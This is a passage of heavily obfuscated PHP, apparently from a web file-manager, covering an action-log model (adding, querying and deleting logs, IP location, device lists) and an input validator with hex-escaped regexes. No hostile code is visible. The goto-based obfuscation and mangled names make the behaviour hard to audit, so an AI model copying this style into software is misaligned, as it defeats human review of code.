array($aëä◊‰Û∞π[2056]), $aëä◊‰Û∞π[2365] => array($aëä◊‰Û∞π[2419]), $aëä◊‰Û∞π[2367] => array($aëä◊‰Û∞π[2420]), $aëä◊‰Û∞π[2049] => array($aëä◊‰Û∞π[2050]), $aëä◊‰Û∞π[2373] => array(), $aëä◊‰Û∞π[2375] => array(), $aëä◊‰Û∞π[2377] => array(), $aëä◊‰Û∞π[2058] => array($aëä◊‰Û∞π[2060]), $aëä◊‰Û∞π[2059] => array($aëä◊‰Û∞π[2060]), $aëä◊‰Û∞π[2381] => array($aëä◊‰Û∞π[2421]), $aëä◊‰Û∞π[2383] => array($aëä◊‰Û∞π[2421]), $aëä◊‰Û∞π[2385] => array($aëä◊‰Û∞π[2422]), $aëä◊‰Û∞π[2371] => array($aëä◊‰Û∞π[2423]), $aëä◊‰Û∞π[2387] => array($aëä◊‰Û∞π[2424]), $aëä◊‰Û∞π[2389] => array($aëä◊‰Û∞π[2425]), $aëä◊‰Û∞π[2053] => array($aëä◊‰Û∞π[2054])); return $B™∫ªÿ»œ’; } private function typeAll() { goto dçãÍ’®«¯; b±Ωπ·πΩ: return $eﬁú’ßê±€; goto cÃÜÉ©“Û≠; aﬁëÊøîãå: foreach ($D¢‚ÿœè—‚ as $Dé®ÿ‰ı≥î => $Bñÿíá◊‘ß) { $eﬁú’ßê±€[$Bñÿíá◊‘ß[0]] = $eﬁú’ßê±€[$Dé®ÿ‰ı≥î]; } $eﬁú’ßê±€[$cΩÏ«áìË[2060]] = LNG($cΩÏ«áìË[2426]); $eﬁú’ßê±€[$cΩÏ«áìË[2421]] = LNG($cΩÏ«áìË[2427]); goto b±Ωπ·πΩ; dçãÍ’®«¯: $cΩÏ«áìË =& $_SERVER[—Ω]; $eﬁú’ßê±€ = $this->typeList; $D¢‚ÿœè—‚ = array_filter($this->typeFile()); goto aﬁëÊøîãå; cÃÜÉ©“Û≠: } public function addLog($EΩ£≥“úõˆ, $BÙ“ƒÍﬁ∑Ü = array()) { goto Fàá⁄Ëª©Œ; féñ£ö‰é®: $BÒáÜëÖçã = get_client_ip(); if (!$BÙ“ƒÍﬁ∑Ü || strlen(json_encode($BÙ“ƒÍﬁ∑Ü)) >= 1024) { $BÙ“ƒÍﬁ∑Ü = array($då∞¢√˜ª[2428] => $BÒáÜëÖçã); } else { if (is_array($BÙ“ƒÍﬁ∑Ü)) { $BÙ“ƒÍﬁ∑Ü[$då∞¢√˜ª[2428]] = $BÒáÜëÖçã; } else { $BÙ“ƒÍﬁ∑Ü = array($då∞¢√˜ª[1038] => $BÙ“ƒÍﬁ∑Ü, $då∞¢√˜ª[2428] => $BÒáÜëÖçã); } } $BÙ“ƒÍﬁ∑Ü = array($då∞¢√˜ª[1407] => Session::sign(), $då∞¢√˜ª[1408] => $B”Í·±¢‚†, $då∞¢√˜ª[29] => $EΩ£≥“úõˆ, $då∞¢√˜ª[1410] => json_encode($BÙ“ƒÍﬁ∑Ü)); goto c¥∞î¨Õ†“; Fàá⁄Ëª©Œ: $då∞¢√˜ª =& $_SERVER[—Ω]; if (!isset($this->typeList[$EΩ£≥“úõˆ])) { return; } $B”Í·±¢‚† = USER_ID ? USER_ID : (isset($BÙ“ƒÍﬁ∑Ü[$då∞¢√˜ª[1417]]) ? $BÙ“ƒÍﬁ∑Ü[$då∞¢√˜ª[1417]] : 0); goto féñ£ö‰é®; c¥∞î¨Õ†“: parent::add($BÙ“ƒÍﬁ∑Ü); goto FıÛÊ‚Ô¯•; FıÛÊ‚Ô¯•: } public function remove($Cçà®üçÓÖ) { $this->where(array($_SERVER[—Ω][382] => $Cçà®üçÓÖ))->delete(); } private function _makeOrder($Bõ™∫ÂÓ•ò = '') { goto A‡≈âè™Áﬂ; a“∫¿ˆè‚É: return $this->order($Bõ™∫ÂÓ•ò); goto A›Ÿò‡Ñ™À; A‡≈âè™Áﬂ: $eê∏≥ÉåÆÇ =& $_SERVER[—Ω]; $a¶Ï¢Û°ù⁄ = $eê∏≥ÉåÆÇ[184]; $fÉÍÌˆ‚ÌÖ = array($eê∏≥ÉåÆÇ[398] => $eê∏≥ÉåÆÇ[399], $eê∏≥ÉåÆÇ[400] => $eê∏≥ÉåÆÇ[401]); goto Fπ⁄…äÃ†Œ; Fπ⁄…äÃ†Œ: $aËèÉÜ’–à = Input::get($eê∏≥ÉåÆÇ[404], $eê∏≥ÉåÆÇ[7], $eê∏≥ÉåÆÇ[2218], array($eê∏≥ÉåÆÇ[2155], $eê∏≥ÉåÆÇ[400])); $aËèÉÜ’–à = $fÉÍÌˆ‚ÌÖ[$aËèÉÜ’–à]; $Bõ™∫ÂÓ•ò = $Bõ™∫ÂÓ•ò . "{$a¶Ï¢Û°ù⁄}\x20{$aËèÉÜ’–à}"; goto a“∫¿ˆè‚É; A›Ÿò‡Ñ™À: } public function get($cå≥Î€»Àë = '') { goto B¯∏ã´Ü°∫; B¯∏ã´Ü°∫: $bπ∂ƒô í€ =& $_SERVER[—Ω]; if (!$cå≥Î€»Àë) { show_json(array()); } $b◊óâæﬂÀı = array(); goto FøÂÆ∞…üë; dóíÕÉä≤â: $c•π‘ﬂ‘Œ‚[$bπ∂ƒô í€[351]] = $this->logList($c•π‘ﬂ‘Œ‚[$bπ∂ƒô í€[351]]); return $c•π‘ﬂ‘Œ‚; goto Fï–«†¯ŸÇ; cÍ∞∫ËÖÑÇ: if (!empty($cå≥Î€»Àë[$bπ∂ƒô í€[2428]])) { $b◊óâæﬂÀı[$bπ∂ƒô í€[401]] = array($bπ∂ƒô í€[761], "\45{$cå≥Î€»Àë[$bπ∂ƒô í€[2428]]}\x25"); } $c•π‘ﬂ‘Œ‚ = $this->_makeOrder()->where($b◊óâæﬂÀı)->selectPage(); if (empty($c•π‘ﬂ‘Œ‚[$bπ∂ƒô í€[351]])) { show_json(array(), !0, $c•π‘ﬂ‘Œ‚[$bπ∂ƒô í€[348]]); } goto dóíÕÉä≤â; FøÂÆ∞…üë: if ($cå≥Î€»Àë[$bπ∂ƒô í€[1417]]) { $b◊óâæﬂÀı[$bπ∂ƒô í€[1417]] = $cå≥Î€»Àë[$bπ∂ƒô í€[1417]]; } if (isset($cå≥Î€»Àë[$bπ∂ƒô í€[712]])) { $bèô≈Â‚áç = $cå≥Î€»Àë[$bπ∂ƒô í€[712]]; $f§ò≈òÁó  = isset($cå≥Î€»Àë[$bπ∂ƒô í€[713]]) ? $cå≥Î€»Àë[$bπ∂ƒô í€[713]] : time(); $b◊óâæﬂÀı[$bπ∂ƒô í€[184]] = array($bπ∂ƒô í€[318], array($bèô≈Â‚áç, $f§ò≈òÁó )); } if ($cå≥Î€»Àë[$bπ∂ƒô í€[29]]) { $B∞àîÚıàÏ = explode($bπ∂ƒô í€[47], $cå≥Î€»Àë[$bπ∂ƒô í€[29]]); $D˜Ë€Ω∞ëú = $this->typeFile(); $bã§≤π≥Úï = array(); foreach ($B∞àîÚıàÏ as $A’ëúÊ†â‚) { $bã§≤π≥Úï[] = $A’ëúÊ†â‚; if (isset($D˜Ë€Ω∞ëú[$A’ëúÊ†â‚])) { $bã§≤π≥Úï = array_merge($bã§≤π≥Úï, $D˜Ë€Ω∞ëú[$A’ëúÊ†â‚]); } } $bã§≤π≥Úï = array_unique($bã§≤π≥Úï); if ($bã§≤π≥Úï) { $b◊óâæﬂÀı[$bπ∂ƒô í€[29]] = array($bπ∂ƒô í€[7], $bã§≤π≥Úï); } } goto cÍ∞∫ËÖÑÇ; Fï–«†¯ŸÇ: } private function ipAddress(&$Bü™Íâ‰˜≤) { $DÃıÃ’¨‚È =& $_SERVER[—Ω]; if (!empty($Bü™Íâ‰˜≤[$DÃıÃ’¨‚È[2428]])) { $F∑ÉÏÆ÷∑¬ = IpLocation::get($Bü™Íâ‰˜≤[$DÃıÃ’¨‚È[2428]]); if ($F∑ÉÏÆ÷∑¬ == $DÃıÃ’¨‚È[2429]) { $F∑ÉÏÆ÷∑¬ = $DÃıÃ’¨‚È[2430]; } } else { $F∑ÉÏÆ÷∑¬ = LNG($DÃıÃ’¨‚È[2431]); } $Bü™Íâ‰˜≤[$DÃıÃ’¨‚È[2432]] = $F∑ÉÏÆ÷∑¬; } private function descZipDownload($fÓ◊›Êâ‚ı, &$bÖÆˆßÆ…À) { $b¿øëûå‡Ç =& $_SERVER[—Ω]; if (!isset($fÓ◊›Êâ‚ı[$b¿øëûå‡Ç[2433]])) { return; } $dÏâﬁÈçêﬂ = json_decode($fÓ◊›Êâ‚ı[$b¿øëûå‡Ç[2433]], !0); foreach ($dÏâﬁÈçêﬂ as $a∫§«“àèò) { if (!IO::init($a∫§«“àèò[$b¿øëûå‡Ç[75]])) { continue; } if (!($B¯Òÿ∂ÁÃÓ = IO::infoFull($a∫§«“àèò[$b¿øëûå‡Ç[75]]))) { continue; } $fÓ◊›Êâ‚ı[$b¿øëûå‡Ç[75]] = $a∫§«“àèò[$b¿øëûå‡Ç[75]]; $bÖÆˆßÆ…À[] = $fÓ◊›Êâ‚ı[$b¿øëûå‡Ç[2251]] = $B¯Òÿ∂ÁÃÓ[$b¿øëûå‡Ç[457]]; break; } return $fÓ◊›Êâ‚ı; } private function getSourceList(&$b∂Œë∫•„Ú) { $A‡≈ı…èÛ∑ =& $_SERVER[—Ω]; $a…°àÖ√àº = array(); foreach ($b∂Œë∫•„Ú as $Cû™√®à“ê => $E„›ê◊Ìé) { goto cú∞ ÖÖÙ€; açÊêüö’√: if ($e÷åµ®¥é≠[$A‡≈ı…èÛ∑[29]] == $A‡≈ı…èÛ∑[2259]) { $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[401]][$A‡≈ı…èÛ∑[366]]; } goto B¥äÁåòóÍ; cåÈ≤ ∞ŒÑ: $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[366]]; $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[2251]]; if ($e÷åµ®¥é≠[$A‡≈ı…èÛ∑[29]] == $A‡≈ı…èÛ∑[488]) { $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[401]][$A‡≈ı…èÛ∑[1010]]; $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[401]][$A‡≈ı…èÛ∑[1011]]; } goto açÊêüö’√; cú∞ ÖÖÙ€: $e÷åµ®¥é≠ = json_decode($E„›ê◊Ìé[$A‡≈ı…èÛ∑[401]], !0); if ($E„›ê◊Ìé[$A‡≈ı…èÛ∑[29]] == $A‡≈ı…èÛ∑[2052]) { $e÷åµ®¥é≠ = $this->descZipDownload($e÷åµ®¥é≠, $a…°àÖ√àº); $b∂Œë∫•„Ú[$Cû™√®à“ê][$A‡≈ı…èÛ∑[401]] = json_encode($e÷åµ®¥é≠); continue; } if (strpos($E„›ê◊Ìé[$A‡≈ı…èÛ∑[29]], $A‡≈ı…èÛ∑[2252]) !== 0) { goto FﬁœëàΩÖ´; cÜπÁ«øÛ∑: $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[366]] = $eõú∫–ˆ∂á[$A‡≈ı…èÛ∑[366]]; $a…°àÖ√àº[] = $e÷åµ®¥é≠[$A‡≈ı…èÛ∑[2251]] = $eõú∫–ˆ∂á[$A‡≈ı…èÛ∑[457]]; $b∂Œë∫•„Ú[$Cû™√®à“ê][$A‡≈ı…èÛ∑[401]] = json_encode($e÷åµ®¥é≠); goto c§©úıüÊÚ; FﬁœëàΩÖ´: if (!isset($e÷åµ®¥é≠[$A‡≈ı…èÛ∑[75]]) || strpos($E„›ê◊Ìé[$A‡≈ı…èÛ∑[29]], $A‡≈ı…èÛ∑[2434]) !== 0) { continue; } if (!IO::init($e÷åµ®¥é≠[$A‡≈ı…èÛ∑[75]])) { continue; } if (!($eõú∫–ˆ∂á = IO::infoFull($e÷åµ®¥é≠[$A‡≈ı…èÛ∑[75]]))) { continue; } goto cÜπÁ«øÛ∑; c§©úıüÊÚ: continue; goto eüÙÕ√ÙôÀ; eüÙÕ√ÙôÀ: } goto cåÈ≤ ∞ŒÑ; B¥äÁåòóÍ: } if (!$a…°àÖ√àº) { return array(); } return Model($A‡≈ı…èÛ∑[762])->sourceListInfo($a…°àÖ√àº, !0); } private function logList($e‹◊⁄Ç…£„) { goto dà◊©áò†Ω; CÛñÆ÷Ñ›Ë: $Aˆ∞Ó◊Ç‰Ö = array(); foreach ($e‹◊⁄Ç…£„ as $dãıéºÉ¢´ => $Eº…é«°¬¥) { goto EÓê¨öÌœô; fìÆèﬂ‡ﬁ™: $this->ipAddress($Eº…é«°¬¥); if (strpos($dÜ≠‰◊≤âŒ, $e»ÌçÏ‡äº[2252]) === 0 || isset($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2251]])) { goto a¢Îá¨á¨Ø; eÎË≈∫ÖΩÇ: if ($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[29]] == $e»ÌçÏ‡äº[2259]) { $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[366]] = $Dî•”Èé‹“[$eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[366]]]; } if ($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[29]] == $e»ÌçÏ‡äº[2047]) { $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2264]] = $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[388]]; $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2251]] = $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2264]][$e»ÌçÏ‡äº[366]]; $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[388]] = !1; $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[366]] = $e»ÌçÏ‡äº[33]; } if ($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[388]] && $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[388]][$e»ÌçÏ‡äº[368]] == $e»ÌçÏ‡äº[1084]) { $Aˆ∞Ó◊Ç‰Ö[] = $Eº…é«°¬¥[$e»ÌçÏ‡äº[364]]; unset($e‹◊⁄Ç…£„[$dãıéºÉ¢´]); continue; } goto AΩ∏‰É√ü€; a¢Îá¨á¨Ø: $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[388]] = $Dî•”Èé‹“[$eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[366]]]; $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2264]] = $Dî•”Èé‹“[$eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2251]]]; if ($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[29]] == $e»ÌçÏ‡äº[488]) { $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[1010]] = $Dî•”Èé‹“[$eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[1010]]]; $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[1011]] = $Dî•”Èé‹“[$eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[401]][$e»ÌçÏ‡äº[1011]]]; } goto eÎË≈∫ÖΩÇ; AΩ∏‰É√ü€: if ($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2264]] && $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2264]][$e»ÌçÏ‡äº[368]] == $e»ÌçÏ‡äº[1084]) { $Aˆ∞Ó◊Ç‰Ö[] = $Eº…é«°¬¥[$e»ÌçÏ‡äº[364]]; unset($e‹◊⁄Ç…£„[$dãıéºÉ¢´]); continue; } goto C¨†ˆÕ˜ôâ; C¨†ˆÕ˜ôâ: } $Eº…é«°¬¥[$e»ÌçÏ‡äº[401]] = $eú©Ü¯ ˆπ; goto E‚Ù ú±ü•; F√∏‰Í∫ ®: $Eº…é«°¬¥[$e»ÌçÏ‡äº[28]] = isset($fñ≤ú—¡‡Ã[$e»ÌçÏ‡äº[28]]) ? $fñ≤ú—¡‡Ã[$e»ÌçÏ‡äº[28]] : LNG($e»ÌçÏ‡äº[2431]); $Eº…é«°¬¥[$e»ÌçÏ‡äº[2300]] = isset($fñ≤ú—¡‡Ã[$e»ÌçÏ‡äº[2300]]) ? $fñ≤ú—¡‡Ã[$e»ÌçÏ‡äº[2300]] : $e»ÌçÏ‡äº[33]; $Eº…é«°¬¥[$e»ÌçÏ‡äº[1325]] = isset($A‘ûùÃ°ÍÑ[$dÜ≠‰◊≤âŒ]) ? $A‘ûùÃ°ÍÑ[$dÜ≠‰◊≤âŒ] : $fùÒç¢Ÿ∫á; goto F”©àœ∑»Ç; EÓê¨öÌœô: $dÜ≠‰◊≤âŒ = $Eº…é«°¬¥[$e»ÌçÏ‡äº[29]]; $fñ≤ú—¡‡Ã = isset($Dß√Ù¯“Û¨[$Eº…é«°¬¥[$e»ÌçÏ‡äº[1417]]]) ? $Dß√Ù¯“Û¨[$Eº…é«°¬¥[$e»ÌçÏ‡äº[1417]]] : !1; $fùÒç¢Ÿ∫á = strpos($dÜ≠‰◊≤âŒ, $e»ÌçÏ‡äº[2435]) == 0 ? LNG($e»ÌçÏ‡äº[2436]) : LNG($e»ÌçÏ‡äº[2431]); goto F√∏‰Í∫ ®; F”©àœ∑»Ç: $Eº…é«°¬¥[$e»ÌçÏ‡äº[2217]] = $fñ≤ú—¡‡Ã; $eú©Ü¯ ˆπ = json_decode($Eº…é«°¬¥[$e»ÌçÏ‡äº[401]], !0); $Eº…é«°¬¥[$e»ÌçÏ‡äº[2428]] = isset($eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2428]]) ? $eú©Ü¯ ˆπ[$e»ÌçÏ‡äº[2428]] : $e»ÌçÏ‡äº[33]; goto fìÆèﬂ‡ﬁ™; E‚Ù ú±ü•: unset($Eº…é«°¬¥[$e»ÌçÏ‡äº[2437]]); $D√ûÂá≈¯˜[] = $Eº…é«°¬¥; goto aùÔìò§Ù¨; aùÔìò§Ù¨: } $this->clearSystemPathLog($Aˆ∞Ó◊Ç‰Ö); goto EóËéà¶ÉÜ; e‘¿ëÔÃÑﬂ: $Dî•”Èé‹“ = $this->getSourceList($e‹◊⁄Ç…£„); $A‘ûùÃ°ÍÑ = $this->typeAll(); $D√ûÂá≈¯˜ = array(); goto CÛñÆ÷Ñ›Ë; EóËéà¶ÉÜ: return $D√ûÂá≈¯˜; goto FîÔÌ¯í¬Ø; dà◊©áò†Ω: $e»ÌçÏ‡äº =& $_SERVER[—Ω]; $B«ÌÕóÕŒÎ = array_to_keyvalue($e‹◊⁄Ç…£„, $e»ÌçÏ‡äº[33], $e»ÌçÏ‡äº[1417]); $Dß√Ù¯“Û¨ = Model($e»ÌçÏ‡äº[473])->userListInfo(array_unique($B«ÌÕóÕŒÎ)); goto e‘¿ëÔÃÑﬂ; FîÔÌ¯í¬Ø: } private function clearSystemPathLog($bÒÔùœâÖ≠) { $A˜¢‘í£”Ç =& $_SERVER[—Ω]; if (count($bÒÔùœâÖ≠) == 0) { return; } $DÓèÍº¥ê◊ = array($A˜¢‘í£”Ç[364] => array($A˜¢‘í£”Ç[7], array_unique($bÒÔùœâÖ≠))); $this->where($DÓèÍº¥ê◊)->delete(); } public function deviceList($bﬂ÷Œô— Á, $Cò◊ëŸíÉé = 0) { $eè”∫Œ‡ñ¶ =& $_SERVER[—Ω]; $D«˜¨˘ú§á = array($eè”∫Œ‡ñ¶[1417] => $bﬂ÷Œô— Á, $eè”∫Œ‡ñ¶[184] => array($eè”∫Œ‡ñ¶[934], $Cò◊ëŸíÉé), $eè”∫Œ‡ñ¶[29] => $eè”∫Œ‡ñ¶[2020]); $c…ç‘ÓÏƒÏ = array(); $CóéÖ‚ı¡Ñ = $this->field($eè”∫Œ‡ñ¶[2438])->where($D«˜¨˘ú§á)->order($eè”∫Œ‡ñ¶[2262])->limit(50)->select(); foreach ($CóéÖ‚ı¡Ñ as $a·àÁÑòóù => $bÇ¡ˆ¥éîﬁ) { goto bÕóù¿ç… ; Cˆè‰ëé•Ì: unset($cÏ‘€Âƒƒ [$eè”∫Œ‡ñ¶[2428]]); $DÛ±Ç•‰ÿá = $this->deviceType($cÏ‘€Âƒƒ [$eè”∫Œ‡ñ¶[2253]]); if (isset($c…ç‘ÓÏƒÏ[$DÛ±Ç•‰ÿá])) { continue; } goto f˘ò•òµßÃ; bÕóù¿ç… : if ($a·àÁÑòóù > 0 && abs($bÇ¡ˆ¥éîﬁ[$eè”∫Œ‡ñ¶[184]] - $CóéÖ‚ı¡Ñ[$a·àÁÑòóù - 1][$eè”∫Œ‡ñ¶[184]]) < 5) { continue; } $cÏ‘€Âƒƒ  = json_decode($bÇ¡ˆ¥éîﬁ[$eè”∫Œ‡ñ¶[401]], !0); $bÇ¡ˆ¥éîﬁ[$eè”∫Œ‡ñ¶[2428]] = isset($cÏ‘€Âƒƒ [$eè”∫Œ‡ñ¶[2428]]) ? $cÏ‘€Âƒƒ [$eè”∫Œ‡ñ¶[2428]] : $eè”∫Œ‡ñ¶[33]; goto Cˆè‰ëé•Ì; f˘ò•òµßÃ: $this->ipAddress($bÇ¡ˆ¥éîﬁ); $bÇ¡ˆ¥éîﬁ[$eè”∫Œ‡ñ¶[401]] = $cÏ‘€Âƒƒ ; $c…ç‘ÓÏƒÏ[$DÛ±Ç•‰ÿá] = $bÇ¡ˆ¥éîﬁ; goto aç‰ı©ÿê•; aç‰ı©ÿê•: } return array_values($c…ç‘ÓÏƒÏ); } public function deviceType($E‹µÿ÷ïáÑ) { return $E‹µÿ÷ïáÑ; } } goto e„Û®É≤‡; FÇö¶Õá·Ê: class Input { public static function getArray($AŸ¥ªÒ´Û–) { goto eöã•à”êË; Aﬂâ÷åì‰„: $BØ‹ƒÕãµ© = array(); $D≤“‡®ò¯ë = LNG($dÍ´åÀ¬ı€[1853]); foreach ($AŸ¥ªÒ´Û– as $dÉò€üßΩ‡ => $fÉ†È¿∑ÎÆ) { goto FŸà∞ÿ‚¶•; FŸà∞ÿ‚¶•: $a®¡¿ﬁ…âú = _get($fÉ†È¿∑ÎÆ, $dÍ´åÀ¬ı€[1242], $D≤“‡®ò¯ë . $dÍ´åÀ¬ı€[886] . $dÉò€üßΩ‡); $EøôÉÃµ◊ù = $dÉò€üßΩ‡; if (isset($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1854]]) && $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1854]]) { $EøôÉÃµ◊ù = $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1854]]; } goto Dí‹∏™ÍßÃ; BÈ≤¡ô©–: if (isset($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1856]]) && !self::check($in[$dÉò€üßΩ‡], $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1856]], $CöØêÖ∏·Ã)) { if (array_key_exists($dÍ´åÀ¬ı€[1855], $fÉ†È¿∑ÎÆ)) { if (!is_null($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]])) { $EËû÷Ì´…É[$EøôÉÃµ◊ù] = $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]]; } } else { $BØ‹ƒÕãµ©[] = $a®¡¿ﬁ…âú; } continue; } $EËû÷Ì´…É[$EøôÉÃµ◊ù] = $in[$dÉò€üßΩ‡]; goto bËôÔÔçß‘; Dí‹∏™ÍßÃ: if (!array_key_exists($dÉò€üßΩ‡, $in)) { if (array_key_exists($dÍ´åÀ¬ı€[1855], $fÉ†È¿∑ÎÆ)) { if (!is_null($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]])) { $EËû÷Ì´…É[$EøôÉÃµ◊ù] = $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]]; } } else { if (isset($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1856]])) { $BØ‹ƒÕãµ©[] = $a®¡¿ﬁ…âú; } } continue; } if (isset($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1856]]) && $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1856]] == $dÍ´åÀ¬ı€[279]) { $eËÀÕﬂè‘Û = json_decode($in[$dÉò€üßΩ‡], !0); if (is_array($eËÀÕﬂè‘Û)) { $EËû÷Ì´…É[$EøôÉÃµ◊ù] = $eËÀÕﬂè‘Û; } else { if (array_key_exists($dÍ´åÀ¬ı€[1855], $fÉ†È¿∑ÎÆ)) { if (!is_null($fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]])) { $EËû÷Ì´…É[$EøôÉÃµ◊ù] = $fÉ†È¿∑ÎÆ[$dÍ´åÀ¬ı€[1855]]; } } else { $BØ‹ƒÕãµ©[] = $a®¡¿ﬁ…âú; } } continue; } $CöØêÖ∏·Ã = _get($fÉ†È¿∑ÎÆ, $dÍ´åÀ¬ı€[1015]); goto BÈ≤¡ô©–; bËôÔÔçß‘: } goto BóçÁô•Ù ; BóçÁô•Ù : if (count($BØ‹ƒÕãµ©) > 0) { show_json(implode($dÍ´åÀ¬ı€[1857], $BØ‹ƒÕãµ©), !1); } return $EËû÷Ì´…É; goto Eù·≥ç·ÍÔ; eöã•à”êË: $dÍ´åÀ¬ı€ =& $_SERVER[—Ω]; global $in; $EËû÷Ì´…É = array(); goto Aﬂâ÷åì‰„; Eù·≥ç·ÍÔ: } public static function reg($a„åÌâ”ä» = "\162\x65\x71\x75\151\x72\x65") { static $CÜòü≥Ñ®É = array("\x72\145\x71\165\151\162\x65" => "\x2e\53", "\x6e\x75\x6d\x62\x65\x72" => "\134\x64\53", "\x68\145\170" => "\x5b\60\x2d\x39\x41\x2d\106\x61\55\146\135\x2b", "\x69\156\x74" => "\x5b\x2d\x5c\53\135\77\x5c\144\53", "\142\x6f\x6f\x6c" => "\60\x7c\61", "\x66\x6c\x6f\141\x74" => "\x5b\55\134\x2b\135\77\134\x64\53\x28\134\56\134\144\x2b\x29\77", "\145\156\147\154\x69\x73\x68" => "\x5b\101\x2d\132\x61\55\x7a\x20\135\x2b", "\143\150\151\156\x65\x73\145" => "\x5b\x5c\x78\x7b\64\x65\60\60\x7d\x2d\134\x78\173\x39\146\141\x35\175\135\53", "\150\141\x73\103\150\x69\x6e\145\x73\x65" => "\57\x28\133\134\x78\x7b\64\145\x30\x30\x7d\x2d\x5c\x78\173\x39\x66\x61\65\175\x5d\x2b\51\x2f\165", "\x65\x6d\141\151\154" => "\134\167\53\x28\x5b\134\x2e\134\x2d\x5d\x5c\167\x2b\x29\52\x5c\x40\134\167\x2b\x28\x5b\134\x2e\x5c\x2d\135\x5c\x77\53\x29\52\x5c\56\134\x77\53", "\160\150\x6f\156\x65" => "\x31\133\63\55\x39\135\134\144\x7b\x39\x7d", "\x74\x65\154\x70\x68\157\x6e\x65" => "\50\134\50\134\x64\x7b\63\x2c\x34\175\134\x29\x7c\134\x64\173\63\54\64\x7d\55\174\x5c\163\51\x3f\134\144\173\x37\54\61\x34\x7d", "\165\x72\154" => "\x28\150\x74\x74\x70\174\146\164\x70\174\150\164\x74\160\163\x29\x3a\134\x2f\x5c\57\133\x5c\167\134\55\137\x5d\53\x28\134\56\133\134\167\134\x2d\x5f\x5d\x2b\51\53\x28\133\x5c\x77\x5c\x2d\134\x2e\x2c\x40\x3f\136\75\45\x26\x3a\134\57\x7e\134\x2b\x23\135\52\x5b\134\167\134\55\x5c\x40\77\136\x3d\x25\x26\x5c\57\x7e\x5c\53\43\135\x29\77", "\165\162\x6c\x46\165\x6c\x6c" => "\133\x61\x2d\x7a\x41\x2d\x7a\x5d\x2b\x3a\134\57\134\57\x5b\x5e\x5c\x73\x5d\52", "\151\x70" => "\x28\134\144\x7b\x31\54\x33\x7d\134\x2e\51\x7b\63\x7d\x28\134\x64\173\x31\54\x33\175\51", "\x7a\x69\x70" => "\x5b\61\x2d\71\x5d\x5c\144\x7b\65\x7d\x28\x3f\x21\x5c\144\x29", "\x69\144\103\141\162\x64" => "\x28\x5c\x64\x7b\x31\x35\175\51\x7c\x28\134\144\173\x31\67\x7d\50\134\x64\x7c\x58\x7c\170\x29\x29", "\x63\157\x6c\x6f\x72" => "\43\50\x5b\60\x2d\x39\x41\x2d\x46\141\x2d\146\x5d\x7b\63\x7d\x7c\x5b\x30\55\x39\101\x2d\x46\141\x2d\x66\135\173\66\x7d\x29", "\x74\x69\155\145" => "\x28\133\60\55\x31\135\x5c\144\174\62\x5b\60\x2d\64\x5d\x29\72\x5b\x30\x2d\65\135\134\144", "\x64\141\164\145" => "\134\x64\x7b\x34\175\x5b\55\x5c\57\135\x3f\50\x30\x5b\61\x2d\x39\135\x7c\x31\x5b\60\55\x32\135\51\x5b\55\134\57\135\77\50\133\x30\x2d\x32\135\x5c\x64\174\x33\133\60\55\61\x5d\51", "\144\141\x74\x65\124\x69\x6d\x65" => "\134\144\173\x34\x7d\133\55\134\57\x5d\x3f\x28\60\133\x31\x2d\x39\135\x7c\x31\x5b\x30\55\62\135\51\x5b\x2d\x5c\x2f\x5d\x3f\x28\x5b\60\55\x32\x5d\x5c\x64\174\x33\133\x30\x2d\61\x5d\51\x5c\x73\53\x28\133\60\x2d\x31\x5d\134\144\x7c\x32\133\x30\x2d\x34\x5d\x29\72\x5b\60\x2d\x35\135\134\144", "\x70\141\x73\x73\x77\157\x72\144" => "\x28\x3f\75\x2e\52\134\x64\x29\x28\x3f\x3d\56\52\133\141\x2d\172\135\x29\50\77\75\56\x2a\133\101\55\x5a\135\51\x2e\173\70\x2c\62\60\175", "\153\x65\x79" => 